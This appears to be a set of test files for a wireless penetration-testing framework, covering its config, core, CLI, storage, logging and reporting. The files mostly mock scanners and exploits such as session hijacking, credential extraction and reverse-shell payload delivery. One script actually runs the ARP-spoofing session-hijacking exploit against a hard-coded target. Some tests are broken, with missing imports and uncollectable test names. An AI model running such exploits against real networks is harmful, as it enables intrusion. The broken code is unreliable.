    """
    Test that the 'list' command displays all available scanners and exploits.
    """
    # Configure the mock scanners and exploits
    mock_coreframework.scanners = {
        'encryption_scanner': MagicMock(),
        'auth_bypass_scanner': MagicMock()
    }
    mock_coreframework.exploits = {
        'session_hijacking': MagicMock(),
        'credential_extraction': MagicMock()
    }

    # Import the CLI after setting up mocks
    from ui.cli import cli

    runner = CliRunner()
    result = runner.invoke(cli, ['list'])

    # Assert exit code
    assert result.exit_code == 0

    # Assert output contains available scanners
    assert "\nAvailable Scanners:" in result.output
    assert "- encryption_scanner" in result.output
    assert "- auth_bypass_scanner" in result.output

    # Assert output contains available exploits
    assert "\nAvailable Exploits:" in result.output
    assert "- session_hijacking" in result.output
    assert "- credential_extraction" in result.output


if __name__ == '__main__':
    import pytest

    pytest.main()


# tests/test_config_manager.py
import unittest
import os
import shutil
from core.config_manager import ConfigManager
from pydantic import ValidationError


class TestConfigManager(unittest.TestCase):
    def setUp(self):
        # Set up a temporary config directory
        self.test_config_dir = "test_config"
        os.makedirs(self.test_config_dir, exist_ok=True)

        # Create default config
        default_config = {
            "general": {
                "interface": "wlan0mon",
                "log_level": "INFO",
                "report_directory": "reports"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 15
                },
                "auth_bypass_scanner": {
                    "scan_duration": 10
                },
                "dos_scanner": {
                    "scan_duration": 10
                }
            },
            "exploits": {
                "session_hijacking": {
                    "max_packets": 100
                },
                "credential_extraction": {
                    "capture_duration": 20
                },
                "payload_delivery": {
                    "payload_types": ["reverse_shell", "malicious_script"],
                    "default_duration": 10
                }
            },
            "ui": {
                "theme": "default"
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            import yaml
            yaml.dump(default_config, f)

        # Create user config with some overrides
        user_config = {
            "general": {
                "interface": "wlan1mon"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 20
                }
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            yaml.dump(user_config, f)

        # Set environment variables to override configurations
        os.environ['GENERAL_LOG_LEVEL'] = 'DEBUG'
        os.environ['EXPLOITS_PAYLOAD_DELIVERY_DEFAULT_DURATION'] = '15'

    def tearDown(self):
        # Remove temporary config directory and environment variables
        shutil.rmtree(self.test_config_dir)
        del os.environ['GENERAL_LOG_LEVEL']
        del os.environ['EXPLOITS_PAYLOAD_DELIVERY_DEFAULT_DURATION']

    def test_load_config(self):
        cm = ConfigManager(config_dir=self.test_config_dir)
        config = cm.get_config()

        # Test overridden general.interface
        self.assertEqual(config.general.interface, "wlan1mon")

        # Test overridden scanners.encryption_scanner.scan_duration
        self.assertEqual(config.scanners.encryption_scanner.scan_duration, 20)

        # Test environment variable override for general.log_level
        self.assertEqual(config.general.log_level, "DEBUG")

        # Test environment variable override for exploits.payload_delivery.default_duration
        self.assertEqual(config.exploits.payload_delivery.default_duration, 15)

        # Test default values that were not overridden
        self.assertEqual(config.scanners.auth_bypass_scanner.scan_duration, 10)
        self.assertEqual(config.exploits.credential_extraction.capture_duration, 20)
        self.assertEqual(config.ui.theme, "default")

    def test_invalid_config(self):
        # Write invalid log_level
        with open(os.path.join(self.test_config_dir, "config.yaml"), 'a') as f:
            f.write("\ngeneral:\n  log_level: 'VERBOSE'\n")

        with self.assertRaises(ValidationError):
            cm = ConfigManager(config_dir=self.test_config_dir)
            cm.get_config()


if __name__ == '__main__':
    unittest.main()


# tests/test_core.py
# tests/test_core.py
import time

import pytest
from unittest import mock
from unittest.mock import MagicMock, mock_open, call
import json
from core import CoreFramework
import os
import threading


# Fixture to mock ConfigManager
@pytest.fixture
def mock_config_manager(mocker):
    mock_config = mocker.Mock()
    mock_config.general.interface = 'wlan0mon'
    mock_config.general.report_directory = '/tmp/reports'
    mock_config.scanners.encryption_scanner.scan_duration = 5
    mock_config.scanners.auth_bypass_scanner.scan_duration = 5
    mock_config.scanners.local_scanner.scan_duration = 5
    mock_config.exploits.session_hijacking.max_packets = 100
    return mock_config


# Fixture to mock vulnerabilities.json
@pytest.fixture
def mock_vulnerabilities(mocker):
    mock_vuln_data = {
        "vuln1": [{"detail": "Sample vulnerability 1"}],
        "vuln2": [{"detail": "Sample vulnerability 2"}]
    }
    mocked_open = mocker.patch("builtins.open", mock_open(read_data=json.dumps(mock_vuln_data)))
    return mock_vuln_data


# Fixture to mock external utilities
@pytest.fixture
def mock_utilities(mocker):
    mock_network_manager = mocker.Mock()
    mock_network_manager.interface = 'wlan0mon'

    mock_data_storage_manager = mocker.Mock()
    mock_data_storage_manager.generate_report = mocker.Mock()

    mock_auth_tools = mocker.Mock()

    return {
        "network_manager": mock_network_manager,
        "data_storage_manager": mock_data_storage_manager,
        "auth_tools": mock_auth_tools
    }


# Fixture to mock scanners
@pytest.fixture
def mock_scanners(mocker):
    mock_encryption_scanner = mocker.Mock()
    mock_auth_bypass_scanner = mocker.Mock()
    mock_dos_scanner = mocker.Mock()
    mock_local_scanner = mocker.Mock()

    scanners = {
        'encryption_scanner': mock_encryption_scanner,
        'auth_bypass_scanner': mock_auth_bypass_scanner,
        'dos_scanner': mock_dos_scanner,
        'local_scanner': mock_local_scanner
    }
    return scanners


# Fixture to mock exploits
@pytest.fixture
def mock_exploits(mocker):
    mock_session_hijacking = mocker.Mock()
    mock_credential_extraction = mocker.Mock()
    mock_payload_delivery = mocker.Mock()

    exploits = {
        'session_hijacking': mock_session_hijacking,
        'credential_extraction': mock_credential_extraction,
        'payload_delivery': mock_payload_delivery
    }
    return exploits


# Fixture to create a CoreFramework instance with all dependencies mocked
@pytest.fixture
def core_framework(mocker, mock_config_manager, mock_vulnerabilities, mock_utilities, mock_scanners, mock_exploits):
    # Mock ConfigManager
    mock_config_manager_instance = mocker.Mock()
    mock_config_manager_instance.get_config.return_value = mock_config_manager
    mocker.patch('core.config_manager.ConfigManager', return_value=mock_config_manager_instance)

    # Mock external utilities
    mocker.patch('core.NetworkInterfaceManager', return_value=mock_utilities['network_manager'])
    mocker.patch('core.DataStorageManager', return_value=mock_utilities['data_storage_manager'])
    mocker.patch('core.AuthenticationTools', return_value=mock_utilities['auth_tools'])

    # Mock scanners
    mocker.patch('core.scanners.encryption_scanner.EncryptionWeaknessScanner',
                 return_value=mock_scanners['encryption_scanner'])
    mocker.patch('core.scanners.auth_bypass_scanner.AuthBypassScanner',
                 return_value=mock_scanners['auth_bypass_scanner'])
    mocker.patch('core.scanners.dos_scanner.DosScanner', return_value=mock_scanners['dos_scanner'])
    mocker.patch('core.scanners.local_scanner.LocalScanner', return_value=mock_scanners['local_scanner'])

    # Mock exploits
    mocker.patch('core.exploits.session_hijacking.SessionHijacking', return_value=mock_exploits['session_hijacking'])
    mocker.patch('core.exploits.credential_extraction.CredentialExtraction',
                 return_value=mock_exploits['credential_extraction'])
    mocker.patch('core.exploits.payload_delivery.PayloadDelivery', return_value=mock_exploits['payload_delivery'])

    # Initialize CoreFramework
    core = CoreFramework(modules_path='/path/to/modules', config_dir='/path/to/config')

    return core


# Test CoreFramework Initialization
def test_coreframework_initialization(core_framework, mock_config_manager, mock_vulnerabilities, mock_utilities,
                                      mock_scanners, mock_exploits):
    # Assert that ConfigManager was initialized with correct config_dir
    core_framework.config_manager.get_config.assert_called_once()

    # Assert that vulnerabilities were loaded correctly
    assert core_framework.vulnerability_db == mock_vulnerabilities

    # Assert that utilities were initialized correctly
    assert core_framework.network_manager.interface == 'wlan0mon'
    assert core_framework.data_storage_manager == mock_utilities['data_storage_manager']
    assert core_framework.auth_tools == mock_utilities['auth_tools']

    # Assert that scanners were initialized correctly
    assert core_framework.scanners['encryption_scanner'] == mock_scanners['encryption_scanner']
    assert core_framework.scanners['auth_bypass_scanner'] == mock_scanners['auth_bypass_scanner']
    assert core_framework.scanners['dos_scanner'] == mock_scanners['dos_scanner']
    assert core_framework.scanners['local_scanner'] == mock_scanners['local_scanner']

    # Assert that exploits were initialized correctly
    assert core_framework.exploits['session_hijacking'] == mock_exploits['session_hijacking']
    assert core_framework.exploits['credential_extraction'] == mock_exploits['credential_extraction']
    assert core_framework.exploits['payload_delivery'] == mock_exploits['payload_delivery']


# Test load_protocol_modules is called during initialization
def test_load_protocol_modules_called(core_framework, mocker):
    mock_load = mocker.spy(core_framework, 'load_protocol_modules')
    # Re-initialize CoreFramework to trigger load_protocol_modules
    core = CoreFramework(modules_path='/path/to/modules', config_dir='/path/to/config')
    core.load_protocol_modules()
    mock_load.assert_called_once()


# Test run_scanner with valid scanner
def test_run_scanner_valid(core_framework, mock_scanners):
    target_info = {'ssid': 'TestSSID', 'bssid': 'AA:BB:CC:DD:EE:FF'}
    mock_scanners['encryption_scanner'].scan.return_value = {'vuln3': [{'detail': 'Sample vulnerability 3'}]}

    core_framework.run_scanner('encryption_scanner', target_info)

    mock_scanners['encryption_scanner'].scan.assert_called_once_with(target_info)
    assert core_framework.vulnerability_db['vuln3'] == [{'detail': 'Sample vulnerability 3'}]


# Test run_scanner with invalid scanner
def test_run_scanner_invalid(core_framework, mocker):
    with mocker.patch.object(core_framework.logger, 'error') as mock_logger_error:
        core_framework.run_scanner('invalid_scanner', {})
        mock_logger_error.assert_called_once_with("Scanner 'invalid_scanner' not found.")


# Test run_exploit with valid exploit
def test_run_exploit_valid(core_framework, mock_exploits):
    vuln_info = {'key': 'value'}
    mock_exploits['session_hijacking'].execute.return_value = {'vuln4': [{'detail': 'Sample vulnerability 4'}]}

    core_framework.run_exploit('session_hijacking', vuln_info)

    mock_exploits['session_hijacking'].execute.assert_called_once_with(vuln_info)
    assert core_framework.vulnerability_db['vuln4'] == [{'detail': 'Sample vulnerability 4'}]


# Test run_exploit with invalid exploit
def test_run_exploit_invalid(core_framework, mocker):
    with mocker.patch.object(core_framework.logger, 'error') as mock_logger_error:
        core_framework.run_exploit('invalid_exploit', {})
        mock_logger_error.assert_called_once_with("Exploit 'invalid_exploit' not found.")


# Test send_continuous_packets and stop_continuous_packets
def test_send_continuous_packets(core_framework, mocker):
    packet = mocker.Mock()
    interval = 0.1  # 100ms for testing

    # Mock sendp and time.sleep
    mock_sendp = mocker.patch('core.sendp')
    mock_sleep = mocker.patch('core.time.sleep', return_value=None)

    # Start sending packets in a separate thread
    send_thread = threading.Thread(target=core_framework.send_continuous_packets, args=(packet, interval))
    send_thread.start()

    # Allow some time for packets to be sent
    time_to_send = 0.35  # Approximately 3 packets
    time.sleep(time_to_send)

    # Stop sending packets
    core_framework.stop_continuous_packets()
    send_thread.join()

    # Assert that sendp was called approximately 3 times
    assert mock_sendp.call_count >= 3


# Test finalize method
def test_finalize(core_framework, mocker):
    # Mock generate_report
    mock_generate_report = mocker.patch.object(core_framework.data_storage_manager, 'generate_report')

    # Call finalize
    core_framework.finalize()

    # Assert that generate_report was called with vulnerability_db
    mock_generate_report.assert_called_once_with(core_framework.vulnerability_db)


# Test load_protocol_modules method (even though it's a placeholder)
def test_load_protocol_modules(core_framework, mocker):
    with mocker.patch.object(core_framework.logger, 'info') as mock_logger_info:
        core_framework.load_protocol_modules()
        mock_logger_info.assert_called_with(
            f"Loading protocol modules from {core_framework.config_manager.config_dir}/protocols...")


# Test that finalize handles exceptions gracefully
def test_finalize_exception(core_framework, mocker):
    # Mock generate_report to raise an exception
    mock_generate_report = mocker.patch.object(core_framework.data_storage_manager, 'generate_report',
                                               side_effect=Exception("Report generation failed"))
    with mocker.patch.object(core_framework.logger, 'error') as mock_logger_error:
        with mocker.patch('core.click.echo') as mock_click_echo:
            core_framework.finalize()
            mock_logger_error.assert_not_called()  # Because finalize doesn't log errors
            mock_click_echo.assert_called_with("Error during finalization: Report generation failed")


# tests/test_data_storage_manager.py
import unittest
from unittest.mock import patch, mock_open
from project_specific_utils.data_storage_manager import DataStorageManager
import os
import shutil
import json
import logging


class TestDataStorageManager(unittest.TestCase):
    def setUp(self):
        # Set up a temporary report directory
        self.test_report_dir = "test_reports"
        self.data_storage_manager = DataStorageManager(report_directory=self.test_report_dir)

    def tearDown(self):
        # Remove temporary report directory after tests
        shutil.rmtree(self.test_report_dir)

    def test_save_and_load_json(self):
        test_data = {'key': 'value'}
        filename = 'test.json'
        self.data_storage_manager.save_json(test_data, filename)

        # Ensure the file exists
        json_path = os.path.join(self.test_report_dir, 'json', filename)
        self.assertTrue(os.path.exists(json_path))

        # Load the data and verify
        loaded_data = self.data_storage_manager.load_json(filename)
        self.assertEqual(test_data, loaded_data)

    def test_save_text(self):
        test_text = "This is a test."
        filename = 'test.txt'
        self.data_storage_manager.save_text(test_text, filename)

        # Ensure the file exists
        text_path = os.path.join(self.test_report_dir, 'txt', filename)
        self.assertTrue(os.path.exists(text_path))

        # Read the file and verify
        with open(text_path, 'r') as f:
            content = f.read()
        self.assertEqual(test_text, content)

    def test_save_binary(self):
        test_binary = b'\x00\xFF\x00\xFF'
        filename = 'test.bin'
        self.data_storage_manager.save_binary(test_binary, filename)

        # Ensure the file exists
        binary_path = os.path.join(self.test_report_dir, 'binary', filename)
        self.assertTrue(os.path.exists(binary_path))

        # Read the file and verify
        with open(binary_path, 'rb') as f:
            content = f.read()
        self.assertEqual(test_binary, content)

    def test_get_report_path_valid(self):
        filename = 'report.json'
        path = self.data_storage_manager.get_report_path('json', filename)
        expected_path = os.path.join(self.test_report_dir, 'json', filename)
        self.assertEqual(path, expected_path)

    def test_get_report_path_invalid(self):
        filename = 'report.xyz'
        with self.assertRaises(ValueError):
            self.data_storage_manager.get_report_path('invalid_type', filename)


if __name__ == '__main__':
    unittest.main()


# tests/test_event_dispatcher.py
import unittest
from unittest.mock import MagicMock
from core.event_dispatcher import EventDispatcher

class TestEventDispatcher(unittest.TestCase):
    def setUp(self):
        self.dispatcher = EventDispatcher()
        self.callback = MagicMock()

    def subscribes_callback_to_event_type(self):
        self.dispatcher.subscribe('test_event', self.callback)
        self.assertIn(self.callback, self.dispatcher.listeners['test_event'])

    def unsubscribes_callback_from_event_type(self):
        self.dispatcher.subscribe('test_event', self.callback)
        self.dispatcher.unsubscribe('test_event', self.callback)
        self.assertNotIn(self.callback, self.dispatcher.listeners['test_event'])

    def dispatches_event_to_subscribed_callbacks(self):
        self.dispatcher.subscribe('test_event', self.callback)
        self.dispatcher.dispatch('test_event', 42, key='value')
        self.callback.assert_called_once_with(42, key='value')

    def does_not_dispatch_event_to_unsubscribed_callbacks(self):
        self.dispatcher.subscribe('test_event', self.callback)
        self.dispatcher.unsubscribe('test_event', self.callback)
        self.dispatcher.dispatch('test_event', 42, key='value')
        self.callback.assert_not_called()

    def handles_exception_in_callback_gracefully(self):
        def faulty_callback(*args, **kwargs):
            raise ValueError("An error occurred")

        self.dispatcher.subscribe('test_event', faulty_callback)
        self.dispatcher.dispatch('test_event')
        self.assertTrue(self.dispatcher.logger.error.called)


if __name__ == '__main__':
    unittest.main()
# The EventDispatcher class is a simple
# implementation of the observer pattern.
# It allows objects to subscribe to specific

# events and receive notifications when


# tests/test_exploits.py
from core import CoreFramework
import os
import time
import logging

def main():
    # Define the path to the protocols/modules directory
    current_dir = os.path.dirname(os.path.abspath(__file__))
    protocols_path = os.path.join(current_dir, '../protocols')

    # Initialize the Core Framework
    core = CoreFramework(protocols_path)

    # Load protocol modules
    core.load_protocol_modules()

    # Load vulnerability database
    # Already loaded in CoreFramework initialization

    # Define the target vulnerability
    vulnerability = {
        'type': 'session_hijacking',
        'description': 'Exploits ARP spoofing to hijack sessions.',
        'target_session': {
            'target_ip': '192.168.1.10',
            'target_mac': 'AA:BB:CC:DD:EE:FF',
            'gateway_ip': '192.168.1.1',
            'gateway_mac': '11:22:33:44:55:66'
        },
        'max_packets': 100
    }

    # Run Session Hijacking exploit
    core.run_exploit('session_hijacking', vulnerability)

if __name__ == "__main__":
    # Configure logging to display debug information
    logging.basicConfig(
        level=logging.DEBUG,
        format='[%(asctime)s] %(levelname)s - %(name)s - %(message)s',
        handlers=[
            logging.StreamHandler()
        ]
    )
    main()


# tests/test_integration_config.py
import unittest
import os
import shutil
from core.config_manager import ConfigManager
from core import CoreFramework


class TestIntegrationConfig(unittest.TestCase):
    def setUp(self):
        # Set up a temporary config directory
        self.test_config_dir = "test_config"
        os.makedirs(self.test_config_dir, exist_ok=True)

        # Create default config
        default_config = {
            "general": {
                "interface": "wlan0mon",
                "log_level": "INFO",
                "report_directory": "reports"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 15
                },
                "auth_bypass_scanner": {
                    "scan_duration": 10
                },
                "dos_scanner": {
                    "scan_duration": 10
                }
            },
            "exploits": {
                "session_hijacking": {
                    "max_packets": 100
                },
                "credential_extraction": {
                    "capture_duration": 20
                },
                "payload_delivery": {
                    "payload_types": ["reverse_shell", "malicious_script"],
                    "default_duration": 10
                }
            },
            "ui": {
                "theme": "default"
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            import yaml
            yaml.dump(default_config, f)

        # Create user config with some overrides
        user_config = {
            "general": {
                "interface": "wlan1mon"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 20
                }
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            yaml.dump(user_config, f)

        # Set environment variables to override configurations
        os.environ['GENERAL_LOG_LEVEL'] = 'DEBUG'
        os.environ['EXPLOITS_PAYLOAD_DELIVERY_DEFAULT_DURATION'] = '15'

        # Initialize Core Framework
        self.core = CoreFramework(modules_path=os.path.join(os.getcwd(), 'protocols'), config_path=self.test_config_dir)

    def tearDown(self):
        # Remove temporary config directory and environment variables
        shutil.rmtree(self.test_config_dir)
        del os.environ['GENERAL_LOG_LEVEL']
        del os.environ['EXPLOITS_PAYLOAD_DELIVERY_DEFAULT_DURATION']

    def test_core_configuration(self):
        # Access Core Framework configuration
        config = self.core.config

        # Verify general settings
        self.assertEqual(config.general.interface, "wlan1mon")
        self.assertEqual(config.general.log_level, "DEBUG")
        self.assertEqual(config.general.report_directory, "reports")

        # Verify scanner settings
        self.assertEqual(config.scanners.encryption_scanner.scan_duration, 20)
        self.assertEqual(config.scanners.auth_bypass_scanner.scan_duration, 10)
        self.assertEqual(config.scanners.dos_scanner.scan_duration, 10)

        # Verify exploit settings
        self.assertEqual(config.exploits.session_hijacking.max_packets, 100)
        self.assertEqual(config.exploits.credential_extraction.capture_duration, 20)
        self.assertEqual(config.exploits.payload_delivery.default_duration, 15)
        self.assertListEqual(config.exploits.payload_delivery.payload_types, ["reverse_shell", "malicious_script"])

        # Verify UI settings
        self.assertEqual(config.ui.theme, "default")

    def test_invalid_core_configuration(self):
        # Write invalid log_level
        with open(os.path.join(self.test_config_dir, "config.yaml"), 'a') as f:
            f.write("\ngeneral:\n  log_level: 'VERBOSE'\n")

        with self.assertRaises(Exception):
            self.core = CoreFramework(modules_path=os.path.join(os.getcwd(), 'protocols'),
                                      config_path=self.test_config_dir)


if __name__ == '__main__':
    unittest.main()


# tests/test_log_manager.py
import unittest
import os
from core.config_manager import ConfigManager
from core.log_manager import LogManager
import logging


class TestLogManager(unittest.TestCase):
    def setUp(self):
        # Set up a temporary config directory
        self.test_config_dir = "test_config"
        os.makedirs(self.test_config_dir, exist_ok=True)

        # Create default config
        default_config = {
            "general": {
                "interface": "wlan0mon",
                "log_level": "DEBUG",
                "report_directory": "reports"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 15
                },
                "auth_bypass_scanner": {
                    "scan_duration": 10
                },
                "dos_scanner": {
                    "scan_duration": 10
                }
            },
            "exploits": {
                "session_hijacking": {
                    "max_packets": 100
                },
                "credential_extraction": {
                    "capture_duration": 20
                },
                "payload_delivery": {
                    "payload_types": ["reverse_shell", "malicious_script"],
                    "default_duration": 10
                }
            },
            "ui": {
                "theme": "default"
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            import yaml
            yaml.dump(default_config, f)

        # Create user config with some overrides
        user_config = {
            "general": {
                "interface": "wlan1mon",
                "log_level": "INFO"
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            yaml.dump(user_config, f)

        # Initialize Config Manager
        self.config_manager = ConfigManager(config_dir=self.test_config_dir)

        # Initialize Log Manager
        self.log_manager = LogManager(self.config_manager)
        self.logger = logging.getLogger('TestLogger')
        self.logger.setLevel(logging.DEBUG)

    def tearDown(self):
        # Remove temporary config directory
        shutil.rmtree(self.test_config_dir)

        # Remove log handlers
        handlers = self.logger.handlers[:]
        for handler in handlers:
            handler.close()
            self.logger.removeHandler(handler)

    def test_logging_output(self):
        # Log messages
        self.logger.debug("This is a DEBUG message.")
        self.logger.info("This is an INFO message.")
        self.logger.warning("This is a WARNING message.")
        self.logger.error("This is an ERROR message.")
        self.logger.critical("This is a CRITICAL message.")

        # Check if log file exists
        log_file = os.path.join(self.config_manager.get_config().general.report_directory, '..', 'logs', 'app.log')
        self.assertTrue(os.path.exists(log_file))

        # Read log file and verify contents
        with open(log_file, 'r') as f:
            logs = f.read()
            self.assertIn("This is a DEBUG message.", logs)
            self.assertIn("This is an INFO message.", logs)
            self.assertIn("This is a WARNING message.", logs)
            self.assertIn("This is an ERROR message.", logs)
            self.assertIn("This is a CRITICAL message.", logs)


if __name__ == '__main__':
    unittest.main()


# tests/test_network_interface_manager.py
import unittest
from unittest.mock import patch, MagicMock
from project_specific_utils.network_interface_manager import NetworkInterfaceManager
import logging

class TestNetworkInterfaceManager(unittest.TestCase):
    def setUp(self):
        # Set up the logger to capture log outputs for assertions
        self.logger = logging.getLogger('NetworkInterfaceManager')
        self.logger.setLevel(logging.DEBUG)
        self.network_manager = NetworkInterfaceManager()

    @patch('project_specific_utils.network_interface_manager.subprocess.run')
    def test_enable_monitor_mode_success(self, mock_run):
        # Mock successful execution of airmon-ng commands
        mock_run.return_value = subprocess.CompletedProcess(args=['airmon-ng', 'start', 'wlan0'], returncode=0, stdout='Monitor mode enabled', stderr='')

        try:
            self.network_manager.enable_monitor_mode('wlan0')
        except Exception as e:
            self.fail(f"enable_monitor_mode raised an exception {e}")

        # Ensure commands were called correctly
        expected_calls = [
            patch.call(['sudo', 'airmon-ng', 'check', 'kill'], check=True, stdout=patch.ANY, stderr=patch.ANY, text=True),
            patch.call(['sudo', 'airmon-ng', 'start', 'wlan0'], check=True, stdout=patch.ANY, stderr=patch.ANY, text=True)
        ]
        self.assertEqual(mock_run.call_count, 2)

    @patch('project_specific_utils.network_interface_manager.subprocess.run')
    def test_enable_monitor_mode_failure(self, mock_run):
        # Mock failure in airmon-ng start command
        mock_run.side_effect = subprocess.CalledProcessError(returncode=1, cmd=['sudo', 'airmon-ng', 'start', 'wlan0'], stderr='Failed to start monitor mode')

        with self.assertRaises(subprocess.CalledProcessError):
            self.network_manager.enable_monitor_mode('wlan0')

    @patch('project_specific_utils.network_interface_manager.subprocess.run')
    def test_get_interface_status_monitor(self, mock_run):
        # Mock iwconfig output indicating monitor mode
        mock_run.return_value = subprocess.CompletedProcess(args=['iwconfig', 'wlan0mon'], returncode=0, stdout='wlan0mon    IEEE 802.11  Mode:Monitor  Frequency:2.437 GHz  Tx-Power=20 dBm\n', stderr='')

        status = self.network_manager.get_interface_status('wlan0mon')
        self.assertEqual(status, "Monitor Mode")

    @patch('project_specific_utils.network_interface_manager.subprocess.run')
    def test_get_interface_status_managed(self, mock_run):
        # Mock iwconfig output indicating managed mode
        mock_run.return_value = subprocess.CompletedProcess(args=['iwconfig', 'wlan0'], returncode=0, stdout='wlan0     IEEE 802.11  ESSID:"TestNetwork"  Nickname:"<WIFI@REALTEK>\n Mode:Managed  Frequency:2.437 GHz  Access Point: 00:11:22:33:44:55 \n', stderr='')

        status = self.network_manager.get_interface_status('wlan0')
        self.assertEqual(status, "Managed Mode")

    @patch('project_specific_utils.network_interface_manager.subprocess.run')
    def test_get_interface_status_unknown(self, mock_run):
        # Mock iwconfig output with unknown mode
        mock_run.return_value = subprocess.CompletedProcess(args=['iwconfig', 'wlan0'], returncode=0, stdout='wlan0     IEEE 802.11  ESSID:"TestNetwork"\n Mode:Unknown\n', stderr='')

        status = self.network_manager.get_interface_status('wlan0')
        self.assertEqual(status, "Unknown")

if __name__ == '__main__':
    unittest.main()


# tests/test_report_generator.py
import unittest
import os
from core.config_manager import ConfigManager
from core.log_manager import LogManager
from core.report_generator import ReportGenerator
from scanners.encryption_scanner import EncryptionWeaknessScanner
from exploits.session_hijacking import SessionHijacking
import shutil
import logging


class TestReportGenerator(unittest.TestCase):
    def setUp(self):
        # Set up a temporary config directory
        self.test_config_dir = "test_config"
        os.makedirs(self.test_config_dir, exist_ok=True)

        # Create default config
        default_config = {
            "general": {
                "interface": "wlan0mon",
                "log_level": "DEBUG",
                "report_directory": "reports"
            },
            "scanners": {
                "encryption_scanner": {
                    "scan_duration": 15
                },
                "auth_bypass_scanner": {
                    "scan_duration": 10
                },
                "dos_scanner": {
                    "scan_duration": 10
                }
            },
            "exploits": {
                "session_hijacking": {
                    "max_packets": 100
                },
                "credential_extraction": {
                    "capture_duration": 20
                },
                "payload_delivery": {
                    "payload_types": ["reverse_shell", "malicious_script"],
                    "default_duration": 10
                }
            },
            "ui": {
                "theme": "default"
            }
        }

        with open(os.path.join(self.test_config_dir, "config.yaml"), 'w') as f:
            import yaml
            yaml.dump(default_config, f)

        # Initialize Config Manager
        self.config_manager = ConfigManager(config_dir=self.test_config_dir)

        # Initialize Log Manager
        self.log_manager = LogManager(self.config_manager)

        # Initialize Scanners and Exploits with mock data
        self.encryption_scanner = EncryptionWeaknessScanner(None,
                                                            self.config_manager.get_config().scanners.encryption_scanner.dict())
        self.encryption_scanner.detected_vulnerabilities = [
            {
                'ssid': 'TestNetwork',
                'bssid': '00:11:22:33:44:55',
                'protocol': 'WEP',
                'description': 'Weak encryption detected.',
                'action': 'Upgrade to WPA2.'
            }
        ]

        self.session_hijacking = SessionHijacking(None,
                                                  self.config_manager.get_config().exploits.session_hijacking.dict())
        self.session_hijacking.detected_vulnerabilities = [
            {
                'target': '192.168.1.10',
                'description': 'Session hijacking successful.',
                'status': 'Compromised',
                'action_taken': 'Gained unauthorized access.'
            }
        ]

        self.scanners = {
            'encryption_scanner': self.encryption_scanner
        }

        self.exploits = {
            'session_hijacking': self.session_hijacking
        }

        # Initialize Report Generator
        self.report_generator = ReportGenerator(self.config_manager.get_config(), self.scanners, self.exploits)
        self.report_generator.create_html_template()

    def tearDown(self):
        # Remove temporary config directory
        shutil.rmtree(self.test_config_dir)

        # Remove report files
        report_dir = os.path.join(os.getcwd(), 'reports')
        if os.path.exists(report_dir):
            shutil.rmtree(report_dir)

    def test_generate_json_report(self):
        self.report_generator.generate_reports()
        json_report_path = os.path.join(self.config_manager.get_config().general.report_directory, 'json',
                                        'report.json')
        self.assertTrue(os.path.exists(json_report_path))

        with open(json_report_path, 'r') as f:
            report_data = json.load(f)
            self.assertIn('scanners', report_data)
            self.assertIn('exploits', report_data)
            self.assertIn('encryption_scanner', report_data['scanners'])
            self.assertIn('session_hijacking', report_data['exploits'])
            self.assertEqual(len(report_data['scanners']['encryption_scanner']['results']), 1)
            self.assertEqual(len(report_data['exploits']['session_hijacking']['results']), 1)

    def test_generate_html_report(self):
        self.report_generator.generate_reports()
        html_report_path = os.path.join(self.config_manager.get_config().general.report_directory, 'html',
                                        'report.html')
        self.assertTrue(os.path.exists(html_report_path))

        with open(html_report_path, 'r') as f:
            html_content = f.read()
            self.assertIn('<h1>WirelessPenTestLib Report</h1>', html_content)
            self.assertIn('Encryption Weakness Scan', html_content)
            self.assertIn('Session Hijacking', html_content)
            self.assertIn('Weak encryption detected.', html_content)
            self.assertIn('Session hijacking successful.', html_content)

    def test_generate_pdf_report(self):
        # Ensure wkhtmltopdf is installed; skip test if not
        try:
            import pdfkit
            self.report_generator.generate_reports()
            pdf_report_path = os.path.join(self.config_manager.get_config().general.report_directory, 'pdf',
                                           'report.pdf')
            self.assertTrue(os.path.exists(pdf_report_path))
        except OSError:
            self.skipTest("wkhtmltopdf not installed. Skipping PDF report generation test.")


if __name__ == '__main__':
    unittest.main()


# tests/test_session_hijack.py
import datetime
import logging
import time
import multiprocessing
from scapy.layers.l2 import ARP
from scapy.all import send, sniff
import json
from jinja2 import Environment, FileSystemLoader
import os

# Mock Implementations

class BaseExploit:
    """
    Mock BaseExploit class for testing purposes.
    """
    def __init__(self, core_framework, vulnerability):
        self.core = core_framework
        self.vulnerability = vulnerability


class PacketInjectorMock:
    """
    Mock PacketInjector for testing.
    """
    def get_interface_mac(self):
        return "00:11:22:33:44:55"

    def get_interface_mode(self):
        return "managed"  # Change to 'monitor' if needed


class PacketHandlerMock:
    """
    Mock PacketHandler for testing.
    """
    def __init__(self):
        self.packet_injector = PacketInjectorMock()


class CoreFramework:
    """
    Mock CoreFramework class for testing purposes.
    """
    def __init__(self, modules_path, interface):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.packet_handler = PacketHandlerMock()
        self.interface = interface

        # Initialize vulnerability database (mocked as empty)
        self.vulnerability_db = {}
        self.logger.warning("Error loading vulnerability database: Expecting value: line 1 column 1 (char 0). Initializing empty vulnerability database.")
        self.logger.warning("Error loading vulnerability database: Expecting value: line 1 column 1 (char 0). Initializing empty vulnerability database.")

        # Initialize other managers (mocked)
        self.logger.info("NetworkInterfaceManager initialized for interface: wlan0mon")
        self.logger.info("DataStorageManager initialized for report directory: reports")
        self.logger.info("AuthenticationTools initialized.")
        self.logger.info("Network and Data Storage Managers initialized successfully.")
        self.logger.info("Loading protocol modules from ....")
        self.logger.debug("Loading module 'base_exploit' from './base_exploit.py'.")
        self.logger.debug("Loading module 'credential_extraction' from './credential_extraction.py'.")
        self.logger.error("Failed to load module 'credential_extraction': attempted relative import with no known parent package")
        self.logger.error("Failed to load module 'credential_extraction': attempted relative import with no known parent package")
